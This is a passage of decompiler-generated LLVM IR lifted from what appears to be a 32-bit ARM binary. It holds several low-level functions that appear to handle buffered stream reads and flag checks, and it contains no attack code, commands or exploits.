  %v3_193d4 = inttoptr i32 %v2_193d4 to i32*
  %v4_193d4 = load i32, i32* %v3_193d4, align 4
  store i32 %v4_193d4, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1937c)
  call void @__pseudo_branch(i32 %v4_1939c)
  %v0_193fc = load i32, i32* %r6.global-to-local, align 4
  %v2_193fc = add i32 %v0_193fc, 48
  %v3_193fc = inttoptr i32 %v2_193fc to i32*
  %v4_193fc = load i32, i32* %v3_193fc, align 4
  store i32 %v4_193fc, i32* %r3.global-to-local, align 4
  %v1_19400 = inttoptr i32 %v4_193fc to i32*
  %v2_19400 = load i32, i32* %v1_19400, align 4
  store i32 %v2_19400, i32* %r4.global-to-local, align 4
  store i32 48, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1944c11 = icmp eq i32 %v2_19400, 0
  br i1 %v2_1944c11, label %dec_label_pc_19458, label %dec_label_pc_19410

dec_label_pc_19410:                               ; preds = %dec_label_pc_193d0, %dec_label_pc_19448
  %v0_194342 = phi i32 [ %v0_19448, %dec_label_pc_19448 ], [ %v2_19400, %dec_label_pc_193d0 ]
  %v1_19410 = inttoptr i32 %v0_194342 to i16*
  %v2_19410 = load i16, i16* %v1_19410, align 2
  %v3_19410 = zext i16 %v2_19410 to i32
  store i32 %v3_19410, i32* %r3.global-to-local, align 4
  %v2_19414 = and i32 %v3_19410, 32816
  %v7_19418 = icmp eq i32 %v2_19414, 48
  %v1_1941c = add i32 %v0_194342, 32
  %v2_1941c = inttoptr i32 %v1_1941c to i32*
  %v3_1941c = load i32, i32* %v2_1941c, align 4
  store i32 %v3_1941c, i32* %r5.global-to-local, align 4
  br i1 %v7_19418, label %dec_label_pc_19428, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_19410
  store i32 %v0_194342, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19448

dec_label_pc_19428:                               ; preds = %dec_label_pc_19410
  %v0_19428 = load i32, i32* %r7.global-to-local, align 4
  %v2_19428 = icmp eq i32 %v0_19428, 0
  br i1 %v2_19428, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_19428
  %v1_1942c = load i32, i32* %r6.global-to-local, align 4
  %v2_1942c = load i32, i32* %r8.global-to-local, align 4
  %v3_1942c = add i32 %v2_1942c, %v1_1942c
  %v4_1942c = inttoptr i32 %v3_1942c to i32*
  %v5_1942c = load i32, i32* %v4_1942c, align 4
  store i32 %v5_1942c, i32* %r3.global-to-local, align 4
  %v3_19430 = inttoptr i32 %v5_1942c to i32*
  store i32 %v3_1941c, i32* %v3_19430, align 4
  %v0_19434 = load i32, i32* %r4.global-to-local, align 4
  %v1_19434 = inttoptr i32 %v0_19434 to i16*
  %v2_19434 = load i16, i16* %v1_19434, align 2
  %v3_19434 = zext i16 %v2_19434 to i32
  store i32 %v3_19434, i32* %r3.global-to-local, align 4
  br label %bb31

bb:                                               ; preds = %dec_label_pc_19428
  %v2_194348 = load i16, i16* %v1_19410, align 2
  %v3_194349 = zext i16 %v2_194348 to i32
  store i32 %v3_194349, i32* %r3.global-to-local, align 4
  %v3_19438 = add i32 %v0_19428, 32
  %v4_19438 = inttoptr i32 %v3_19438 to i32*
  store i32 %v3_1941c, i32* %v4_19438, align 4
  %v0_1943c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %.thread, %bb
  %v0_1943c = phi i32 [ %v3_19434, %.thread ], [ %v0_1943c.pre, %bb ]
  %v1_1943c = and i32 %v0_1943c, 8192
  %v2_1943c = icmp eq i32 %v1_1943c, 0
  br i1 %v2_1943c, label %bb33, label %bb32

bb32:                                             ; preds = %bb31
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_19444 = xor i1 %v2_1943c, true
  call void @__pseudo_cond_branch(i1 %v1_19444, i32 ptrtoint (i32* @global_var_15850.966 to i32))
  %v0_19448.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19448

dec_label_pc_19448:                               ; preds = %.thread21, %bb33
  %v0_19448 = phi i32 [ %v0_19448.pre, %bb33 ], [ %v3_1941c, %.thread21 ]
  store i32 %v0_19448, i32* %r4.global-to-local, align 4
  %v2_1944c = icmp eq i32 %v0_19448, 0
  br i1 %v2_1944c, label %dec_label_pc_1944c.dec_label_pc_19458_crit_edge, label %dec_label_pc_19410

dec_label_pc_1944c.dec_label_pc_19458_crit_edge:  ; preds = %dec_label_pc_19448
  %v0_19464.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19458

dec_label_pc_19458:                               ; preds = %dec_label_pc_1944c.dec_label_pc_19458_crit_edge, %dec_label_pc_193d0
  %v0_19464 = phi i32 [ %v0_19464.pre, %dec_label_pc_1944c.dec_label_pc_19458_crit_edge ], [ %v0_193fc, %dec_label_pc_193d0 ]
  store i32 24, i32* %r3.global-to-local, align 4
  %v2_19464 = add i32 %v0_19464, 24
  %v3_19464 = inttoptr i32 %v2_19464 to i32*
  %v4_19464 = load i32, i32* %v3_19464, align 4
  call void @__pseudo_branch(i32 %v4_19464)
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_19474 = load i32, i32* %r6.global-to-local, align 4
  %v2_19474 = add i32 %v0_19474, 52
  %v3_19474 = inttoptr i32 %v2_19474 to i32*
  %v4_19474 = load i32, i32* %v3_19474, align 4
  store i32 %v4_19474, i32* %r3.global-to-local, align 4
  %v0_19478 = load i32, i32* %r4.global-to-local, align 4
  %v2_19478 = inttoptr i32 %v4_19474 to i32*
  store i32 %v0_19478, i32* %v2_19478, align 4
  %v0_19480.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1947c

dec_label_pc_1947c:                               ; preds = %dec_label_pc_19358, %dec_label_pc_193bc, %dec_label_pc_19458
  %v0_19480 = phi i32 [ %v0_193ac, %dec_label_pc_19358 ], [ %v0_193ac, %dec_label_pc_193bc ], [ %v0_19480.pre, %dec_label_pc_19458 ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_19480 = add i32 %v0_19480, 12
  %v3_19480 = inttoptr i32 %v2_19480 to i32*
  %v4_19480 = load i32, i32* %v3_19480, align 4
  %v1_19484 = inttoptr i32 %v4_19480 to i32*
  %v2_19484 = load i32, i32* %v1_19484, align 4
  %v1_19488 = add i32 %v2_19484, -1
  store i32 %v1_19488, i32* %v1_19484, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_1949c = load i32, i32* %r6.global-to-local, align 4
  %v2_1949c = add i32 %v0_1949c, 24
  %v3_1949c = inttoptr i32 %v2_1949c to i32*
  %v4_1949c = load i32, i32* %v3_1949c, align 4
  store i32 %v4_1949c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1949c)
  %v2_194ac = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_194ac, i32* %r4.global-to-local, align 4
  ret i32 %v2_19388

; uselistorder directives
  uselistorder i32 %v0_19448, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 20, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder label %dec_label_pc_1947c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19448, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_19410, { 1, 0 }
}

define i32 @function_194b8(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_194b8:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-72 = alloca i32, align 4
  %v0_194b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_194b8, label %bb, label %dec_label_pc_194b8..thread8_crit_edge

dec_label_pc_194b8..thread8_crit_edge:            ; preds = %dec_label_pc_194b8
  %v0_194f4.pre = load i32, i32* @r0, align 4
  br label %.thread8

bb:                                               ; preds = %dec_label_pc_194b8
  store i32 0, i32* @r0, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_194b8..thread8_crit_edge, %bb
  %v0_19510.pr = phi i32 [ %v0_194f4.pre, %dec_label_pc_194b8..thread8_crit_edge ], [ 0, %bb ]
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 180260, i32* %sb.global-to-local, align 4
  %v4_194f0 = load i32, i32* inttoptr (i32 180308 to i32*), align 4
  store i32 %v4_194f0, i32* %r3.global-to-local, align 4
  %v9_194f4 = icmp eq i32 %v0_19510.pr, %v4_194f0
  store i32 %v0_19510.pr, i32* %fp.global-to-local, align 4
  br i1 %v9_194f4, label %bb49, label %dec_label_pc_1950c

bb49:                                             ; preds = %.thread8
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1951c

dec_label_pc_1950c:                               ; preds = %.thread8
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_19510 = icmp eq i32 %v0_19510.pr, 0
  br i1 %v2_19510, label %dec_label_pc_1951c, label %dec_label_pc_19684

dec_label_pc_1951c:                               ; preds = %bb49, %dec_label_pc_1950c
  %stack_var_-60.1.in = phi i32 [ 0, %bb49 ], [ 256, %dec_label_pc_1950c ]
  store i32 116, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_19530 = load i32, i32* inttoptr (i32 180376 to i32*), align 8
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_1953c = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  store i32 16, i32* %stack_var_-72, align 4
  store i32 %v4_19530, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1953c)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_19560 = load i32, i32* %sb.global-to-local, align 4
  %v2_19560 = add i32 %v0_19560, 16
  %v3_19560 = inttoptr i32 %v2_19560 to i32*
  %v4_19560 = load i32, i32* %v3_19560, align 4
  call void @__pseudo_branch(i32 %v4_19560)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_19570 = add i32 %v0_19560, 12
  %v3_19570 = inttoptr i32 %v2_19570 to i32*
  %v4_19570 = load i32, i32* %v3_19570, align 4
  store i32 %v4_19570, i32* %r2.global-to-local, align 4
  %v1_19574 = inttoptr i32 %v4_19570 to i32*
  %v2_19574 = load i32, i32* %v1_19574, align 4
  store i32 24, i32* %sl.global-to-local, align 4
  %v1_1957c = add i32 %v2_19574, 1
  store i32 %v1_1957c, i32* %r3.global-to-local, align 4
  %v2_19580 = add i32 %v0_19560, 24
  %v3_19580 = inttoptr i32 %v2_19580 to i32*
  %v4_19580 = load i32, i32* %v3_19580, align 4
  store i32 %v1_1957c, i32* %v1_19574, align 4
  call void @__pseudo_branch(i32 %v4_19580)
  store i32 104, i32* %r3.global-to-local, align 4
  %v0_1959c = load i32, i32* %sb.global-to-local, align 4
  %v2_1959c = add i32 %v0_1959c, 104
  %v3_1959c = inttoptr i32 %v2_1959c to i32*
  %v4_1959c = load i32, i32* %v3_1959c, align 4
  store i32 %v4_1959c, i32* @r4, align 4
  store i32 %v4_1959c, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1953c)
  call void @__pseudo_branch(i32 %v4_19560)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_195c4 = load i32, i32* %sb.global-to-local, align 4
  %v2_195c4 = add i32 %v0_195c4, 48
  %v3_195c4 = inttoptr i32 %v2_195c4 to i32*
  %v4_195c4 = load i32, i32* %v3_195c4, align 4
  store i32 %v4_195c4, i32* %r3.global-to-local, align 4
  %v1_195d0 = inttoptr i32 %v4_195c4 to i32*
  %v2_195d0 = load i32, i32* %v1_195d0, align 4
  store i32 %v2_195d0, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_19580)
  %v0_195dc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_195dc, i32* @r6, align 4
  %v2_195e0 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_195e0, i32* @r8, align 4
  store i32 76, i32* %fp.global-to-local, align 4
  %v0_19674.pr = load i32, i32* @r7, align 4
  %v2_1967428 = icmp eq i32 %v0_19674.pr, 0
  br i1 %v2_1967428, label %dec_label_pc_1967c, label %dec_label_pc_195e8

dec_label_pc_195e8:                               ; preds = %dec_label_pc_1951c, %dec_label_pc_19670
  %v0_195f4 = phi i32 [ %v3_19670, %dec_label_pc_19670 ], [ %v0_19674.pr, %dec_label_pc_1951c ]
  %v1_195e8 = inttoptr i32 %v0_195f4 to i16*
  %v2_195e8 = load i16, i16* %v1_195e8, align 2
  %v3_195e8 = zext i16 %v2_195e8 to i32
  store i32 %v3_195e8, i32* %r3.global-to-local, align 4
  %v1_195ec = and i32 %v3_195e8, 64
  %v2_195ec = icmp eq i32 %v1_195ec, 0
  br i1 %v2_195ec, label %dec_label_pc_19670, label %dec_label_pc_195f4

dec_label_pc_195f4:                               ; preds = %dec_label_pc_195e8
  %v1_195f4 = add i32 %v0_195f4, 56
  store i32 %v1_195f4, i32* @r4, align 4
  store i32 %v1_195f4, i32* %r2.global-to-local, align 4
  %v0_19604 = load i32, i32* %sb.global-to-local, align 4
  %v1_19604 = load i32, i32* %fp.global-to-local, align 4
  %v2_19604 = add i32 %v1_19604, %v0_19604
  %v3_19604 = inttoptr i32 %v2_19604 to i32*
  %v4_19604 = load i32, i32* %v3_19604, align 4
  call void @__pseudo_branch(i32 %v4_19604)
  %v1_19614 = load i32, i32* @r8, align 4
  %v2_19614 = add i32 %v1_19614, %v0_19604
  %v3_19614 = inttoptr i32 %v2_19614 to i32*
  %v4_19614 = load i32, i32* %v3_19614, align 4
  call void @__pseudo_branch(i32 %v4_19614)
  %v0_19620 = load i32, i32* @r7, align 4
  %v1_19620 = inttoptr i32 %v0_19620 to i16*
  %v2_19620 = load i16, i16* %v1_19620, align 2
  %v3_19620 = zext i16 %v2_19620 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_19628 = or i32 %v3_19620, %stack_var_-60.1.in
  %v1_1962c = xor i32 %v2_19628, 320
  store i32 %v1_1962c, i32* %r3.global-to-local, align 4
  %v1_19630 = and i32 %v1_1962c, 832
  %v2_19630 = icmp eq i32 %v1_19630, 0
  br i1 %v2_19630, label %dec_label_pc_19638, label %bb50

dec_label_pc_19638:                               ; preds = %dec_label_pc_195f4
  store i32 %v0_19620, i32* @r0, align 4
  %v0_1963c = call i32 @function_12d98()
  %v2_19640 = icmp eq i32 %v0_1963c, 0
  br i1 %v2_19640, label %.thread16, label %.thread17

.thread16:                                        ; preds = %dec_label_pc_19638
  %v1_19644 = load i32, i32* @r7, align 4
  %v2_19644 = inttoptr i32 %v1_19644 to i16*
  %v3_19644 = load i16, i16* %v2_19644, align 2
  %v4_19644 = zext i16 %v3_19644 to i32
  store i32 %v4_19644, i32* %r3.global-to-local, align 4
  %v2_19648 = add i32 %v1_19644, 8
  %v3_19648 = inttoptr i32 %v2_19648 to i32*
  %v4_19648 = load i32, i32* %v3_19648, align 4
  store i32 %v4_19648, i32* %r2.global-to-local, align 4
  %v2_1964c = and i32 %v4_19644, 65471
  store i32 %v2_1964c, i32* %r3.global-to-local, align 4
  %v3_19650 = add i32 %v1_19644, 28
  %v4_19650 = inttoptr i32 %v3_19650 to i32*
  store i32 %v4_19648, i32* %v4_19650, align 4
  %v1_19654 = load i32, i32* %r3.global-to-local, align 4
  %v2_19654 = trunc i32 %v1_19654 to i16
  %v3_19654 = load i32, i32* @r7, align 4
  %v4_19654 = inttoptr i32 %v3_19654 to i16*
  store i16 %v2_19654, i16* %v4_19654, align 2
  br label %bb50

.thread17:                                        ; preds = %dec_label_pc_19638
  store i32 -1, i32* @r6, align 4
  br label %bb50

bb50:                                             ; preds = %.thread16, %dec_label_pc_195f4, %.thread17
  %v0_19664 = load i32, i32* %sb.global-to-local, align 4
  %v1_19664 = load i32, i32* %sl.global-to-local, align 4
  %v2_19664 = add i32 %v1_19664, %v0_19664
  %v3_19664 = inttoptr i32 %v2_19664 to i32*
  %v4_19664 = load i32, i32* %v3_19664, align 4
  call void @__pseudo_branch(i32 %v4_19664)
  %v0_19670.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_19670

dec_label_pc_19670:                               ; preds = %dec_label_pc_195e8, %bb50
  %v0_19670 = phi i32 [ %v0_195f4, %dec_label_pc_195e8 ], [ %v0_19670.pre, %bb50 ]
  %v1_19670 = add i32 %v0_19670, 32
  %v2_19670 = inttoptr i32 %v1_19670 to i32*
  %v3_19670 = load i32, i32* %v2_19670, align 4
  store i32 %v3_19670, i32* @r7, align 4
  %v2_19674 = icmp eq i32 %v3_19670, 0
  br i1 %v2_19674, label %dec_label_pc_1967c, label %dec_label_pc_195e8

dec_label_pc_1967c:                               ; preds = %dec_label_pc_19670, %dec_label_pc_1951c
  %v0_1967c = call i32 @function_19358()
  %v0_196b8.pre = load i32, i32* @r6, align 4
  br label %bb52

dec_label_pc_19684:                               ; preds = %dec_label_pc_1950c
  %v1_19684 = inttoptr i32 %v0_19510.pr to i16*
  %v2_19684 = load i16, i16* %v1_19684, align 2
  %v3_19684 = zext i16 %v2_19684 to i32
  %v1_19688 = and i32 %v3_19684, 64
  store i32 %v1_19688, i32* %r3.global-to-local, align 4
  %v2_19688 = icmp eq i32 %v1_19688, 0
  br i1 %v2_19688, label %bb51, label %dec_label_pc_19694

bb51:                                             ; preds = %dec_label_pc_19684
  br label %bb52

dec_label_pc_19694:                               ; preds = %dec_label_pc_19684
  %v0_19694 = call i32 @function_12d98()
  %v2_19698 = icmp eq i32 %v0_19694, 0
  br i1 %v2_19698, label %.thread24, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_19694
  br label %bb52

.thread24:                                        ; preds = %dec_label_pc_19694
  %v1_1969c = load i32, i32* %fp.global-to-local, align 4
  %v2_1969c = inttoptr i32 %v1_1969c to i16*
  %v3_1969c = load i16, i16* %v2_1969c, align 2
  %v4_1969c = zext i16 %v3_1969c to i32
  store i32 %v4_1969c, i32* %r3.global-to-local, align 4
  %v2_196a0 = add i32 %v1_1969c, 8
  %v3_196a0 = inttoptr i32 %v2_196a0 to i32*
  %v4_196a0 = load i32, i32* %v3_196a0, align 4
  store i32 %v4_196a0, i32* %r2.global-to-local, align 4
  %v2_196a4 = and i32 %v4_1969c, 65471
  store i32 %v2_196a4, i32* %r3.global-to-local, align 4
  %v2_196a8 = trunc i32 %v2_196a4 to i16
  store i16 %v2_196a8, i16* %v2_1969c, align 2
  %v1_196ac = load i32, i32* %r2.global-to-local, align 4
  %v2_196ac = load i32, i32* %fp.global-to-local, align 4
  %v3_196ac = add i32 %v2_196ac, 28
  %v4_196ac = inttoptr i32 %v3_196ac to i32*
  store i32 %v1_196ac, i32* %v4_196ac, align 4
  br label %bb52

bb52:                                             ; preds = %bb51, %.thread26, %dec_label_pc_1967c, %.thread24
  %v0_196b8 = phi i32 [ -1, %.thread26 ], [ 0, %bb51 ], [ %v0_196b8.pre, %dec_label_pc_1967c ], [ 0, %.thread24 ]
  ret i32 %v0_196b8

; uselistorder directives
  uselistorder i32 %v3_19670, { 1, 2, 0 }
  uselistorder i32 %v0_19560, { 1, 0, 2 }
  uselistorder i32 %v0_19510.pr, { 1, 0, 2, 3 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder label %bb52, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_19670, { 1, 0 }
  uselistorder label %bb50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_195e8, { 1, 0 }
  uselistorder label %dec_label_pc_1951c, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @function_196cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_196cc:
  %v0_196cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_196cc, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_196cc
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_196cc, %bb
  %v5_196e8 = phi i32 [ %arg1, %dec_label_pc_196cc ], [ 0, %bb ]
  ret i32 %v5_196e8

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @function_196ec(i16* %arg1) local_unnamed_addr {
dec_label_pc_196ec:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_196ec = load i32, i32* @r4, align 4
  store i32 %v3_196ec, i32* %stack_var_-12, align 4
  %v6_196ec = load i32, i32* @r5, align 4
  %v9_196ec = load i32, i32* @lr, align 4
  %v0_196f0 = load i32, i32* @r0, align 4
  %v1_196f0 = add i32 %v0_196f0, 16
  %v2_196f0 = inttoptr i32 %v1_196f0 to i32*
  %v3_196f0 = load i32, i32* %v2_196f0, align 4
  store i32 %v3_196f0, i32* %r2.global-to-local, align 4
  %v1_196f4 = add i32 %v0_196f0, 24
  %v2_196f4 = inttoptr i32 %v1_196f4 to i32*
  %v3_196f4 = load i32, i32* %v2_196f4, align 4
  %v3_196f8 = icmp ult i32 %v3_196f0, %v3_196f4
  store i32 %v0_196f0, i32* @r4, align 4
  br i1 %v3_196f8, label %bb, label %dec_label_pc_19718

bb:                                               ; preds = %dec_label_pc_196ec
  %v2_19704 = inttoptr i32 %v3_196f0 to i8*
  %v3_19704 = load i8, i8* %v2_19704, align 1
  %v4_19704 = zext i8 %v3_19704 to i32
  store i32 %v4_19704, i32* %r0.global-to-local, align 4
  %v6_19704 = add i32 %v3_196f0, 1
  store i32 %v6_19704, i32* %r2.global-to-local, align 4
  store i32 %v6_19704, i32* %v2_196f0, align 4
  br label %dec_label_pc_19804

dec_label_pc_19718:                               ; preds = %dec_label_pc_196ec
  store i32 180260, i32* @r5, align 4
  %v1_19718 = inttoptr i32 %v0_196f0 to i16*
  %v2_19718 = load i16, i16* %v1_19718, align 2
  %v3_19718 = zext i16 %v2_19718 to i32
  %v1_1971c = and i32 %v3_19718, 131
  %tmp24 = icmp ugt i32 %v1_1971c, 128
  br i1 %tmp24, label %dec_label_pc_19738, label %dec_label_pc_19728

dec_label_pc_19728:                               ; preds = %dec_label_pc_19718
  store i32 128, i32* @r1, align 4
  %v0_1972c = call i32 @function_1b254()
  store i32 %v0_1972c, i32* %r0.global-to-local, align 4
  %v2_19730 = icmp eq i32 %v0_1972c, 0
  br i1 %v2_19730, label %dec_label_pc_19728.dec_label_pc_19738_crit_edge, label %dec_label_pc_19800

dec_label_pc_19728.dec_label_pc_19738_crit_edge:  ; preds = %dec_label_pc_19728
  %v0_19738.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19738

dec_label_pc_19738:                               ; preds = %dec_label_pc_19728.dec_label_pc_19738_crit_edge, %dec_label_pc_19718
  %v2_19778 = phi i32 [ %v0_19738.pre, %dec_label_pc_19728.dec_label_pc_19738_crit_edge ], [ %v0_196f0, %dec_label_pc_19718 ]
  %v1_19738 = inttoptr i32 %v2_19778 to i16*
  %v2_19738 = load i16, i16* %v1_19738, align 2
  %v3_19738 = zext i16 %v2_19738 to i32
  store i32 %v3_19738, i32* %r2.global-to-local, align 4
  %v1_1973c = and i32 %v3_19738, 2
  %v2_1973c = icmp eq i32 %v1_1973c, 0
  br i1 %v2_1973c, label %dec_label_pc_19768, label %dec_label_pc_19744

dec_label_pc_19744:                               ; preds = %dec_label_pc_19738
  %tmp25 = urem i16 %v2_19738, 2
  %v1_19744 = zext i16 %tmp25 to i32
  %tmp21 = sub nsw i32 0, %v1_19744
  %v4_19748 = and i32 %tmp21, 4
  %v5_19748 = add i32 %v4_19748, %v2_19778
  %v1_1974c = add i32 %v5_19748, 36
  %v2_1974c = inttoptr i32 %v1_1974c to i8*
  %v3_1974c = load i8, i8* %v2_1974c, align 1
  %v4_1974c = zext i8 %v3_1974c to i32
  %v1_19750 = add nsw i32 %v3_19738, -1
  store i32 %v1_19750, i32* %r2.global-to-local, align 4
  store i32 %v4_1974c, i32* %r0.global-to-local, align 4
  %v2_1975c = add i32 %v2_19778, 40
  %v3_1975c = inttoptr i32 %v2_1975c to i32*
  store i32 0, i32* %v3_1975c, align 4
  %v0_19760 = load i32, i32* %r2.global-to-local, align 4
  %v1_19760 = trunc i32 %v0_19760 to i16
  %v2_19760 = load i32, i32* @r4, align 4
  %v3_19760 = inttoptr i32 %v2_19760 to i16*
  store i16 %v1_19760, i16* %v3_19760, align 2
  br label %dec_label_pc_19804

dec_label_pc_19768:                               ; preds = %dec_label_pc_19738
  %v1_19768 = add i32 %v2_19778, 16
  %v1_1976c = inttoptr i32 %v1_19768 to i32*
  %v2_1976c = load i32, i32* %v1_1976c, align 4
  %v3_1976c = add i32 %v2_19778, 20
  %v4_1976c = inttoptr i32 %v3_1976c to i32*
  %v5_1976c = load i32, i32* %v4_1976c, align 4
  %v9_19770 = icmp eq i32 %v5_1976c, %v2_1976c
  br i1 %v9_19770, label %dec_label_pc_19780, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_19768
  %v2_19774 = inttoptr i32 %v2_1976c to i8*
  %v3_19774 = load i8, i8* %v2_19774, align 1
  %v4_19774 = zext i8 %v3_19774 to i32
  store i32 %v4_19774, i32* %r0.global-to-local, align 4
  %v6_19774 = add i32 %v2_1976c, 1
  store i32 %v6_19774, i32* %v1_1976c, align 4
  br label %dec_label_pc_19804

dec_label_pc_19780:                               ; preds = %dec_label_pc_19768
  %v1_19780 = add i32 %v2_19778, 4
  %v2_19780 = inttoptr i32 %v1_19780 to i32*
  %v3_19780 = load i32, i32* %v2_19780, align 4
  %v7_19784 = icmp eq i32 %v3_19780, -2
  br i1 %v7_19784, label %.thread8, label %dec_label_pc_19798

.thread8:                                         ; preds = %dec_label_pc_19780
  %v2_19788 = or i16 %v2_19738, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_19788, i16* %v1_19738, align 2
  br label %dec_label_pc_19804

dec_label_pc_19798:                               ; preds = %dec_label_pc_19780
  %v1_19798 = and i32 %v3_19738, 768
  %v2_19798 = icmp eq i32 %v1_19798, 0
  br i1 %v2_19798, label %.thread10, label %bb22

bb22:                                             ; preds = %dec_label_pc_19798
  %v1_197a0 = load i32, i32* @r5, align 4
  %v3_197a0 = add i32 %v1_197a0, 48
  %v4_197a0 = inttoptr i32 %v3_197a0 to i32*
  %v5_197a0 = load i32, i32* %v4_197a0, align 4
  store i32 %v5_197a0, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_19798, %bb22
  %v1_197a4 = xor i1 %v2_19798, true
  call void @__pseudo_cond_branch(i1 %v1_197a4, i32 ptrtoint (i32* @global_var_194e0.974 to i32))
  %v0_197a8 = load i32, i32* @r4, align 4
  %v1_197a8 = add i32 %v0_197a8, 8
  store i32 %v1_197a8, i32* %r2.global-to-local, align 4
  %v1_197ac = inttoptr i32 %v1_197a8 to i32*
  %v2_197ac = load i32, i32* %v1_197ac, align 4
  store i32 %v2_197ac, i32* %r2.global-to-local, align 4
  %v3_197ac = add i32 %v0_197a8, 12
  %v4_197ac = inttoptr i32 %v3_197ac to i32*
  %v5_197ac = load i32, i32* %v4_197ac, align 4
  %v9_197b0 = icmp eq i32 %v5_197ac, %v2_197ac
  br i1 %v9_197b0, label %dec_label_pc_197e4, label %dec_label_pc_197b8

dec_label_pc_197b8:                               ; preds = %.thread10
  %v2_197b8 = add i32 %v0_197a8, 24
  %v3_197b8 = inttoptr i32 %v2_197b8 to i32*
  store i32 %v2_197ac, i32* %v3_197b8, align 4
  %v0_197bc = load i32, i32* @r4, align 4
  store i32 %v0_197bc, i32* %r0.global-to-local, align 4
  %v2_197c0 = call i32 @function_1b224(i32 %v0_197bc)
  store i32 %v2_197c0, i32* %r0.global-to-local, align 4
  %v2_197c4 = icmp eq i32 %v2_197c0, 0
  br i1 %v2_197c4, label %dec_label_pc_19800, label %dec_label_pc_197cc

dec_label_pc_197cc:                               ; preds = %dec_label_pc_197b8
  %v0_197cc = load i32, i32* @r4, align 4
  %v1_197cc = add i32 %v0_197cc, 20
  %v2_197cc = inttoptr i32 %v1_197cc to i32*
  %v3_197cc = load i32, i32* %v2_197cc, align 4
  %v2_197d0 = add i32 %v0_197cc, 24
  %v3_197d0 = inttoptr i32 %v2_197d0 to i32*
  store i32 %v3_197cc, i32* %v3_197d0, align 4
  %v0_197d4 = load i32, i32* @r4, align 4
  %v1_197d4 = add i32 %v0_197d4, 16
  %v2_197d4 = inttoptr i32 %v1_197d4 to i32*
  %v3_197d4 = load i32, i32* %v2_197d4, align 4
  %v1_197d8 = inttoptr i32 %v3_197d4 to i8*
  %v2_197d8 = load i8, i8* %v1_197d8, align 1
  %v3_197d8 = zext i8 %v2_197d8 to i32
  store i32 %v3_197d8, i32* %r0.global-to-local, align 4
  %v5_197d8 = add i32 %v3_197d4, 1
  store i32 %v5_197d8, i32* %v2_197d4, align 4
  br label %dec_label_pc_19804

dec_label_pc_197e4:                               ; preds = %.thread10
  %v1_197e4 = inttoptr i32 %v0_197a8 to i16*
  store i32 %v0_197a8, i32* %r0.global-to-local, align 4
  %v2_197e8 = ptrtoint i8* %stack_var_-17 to i32
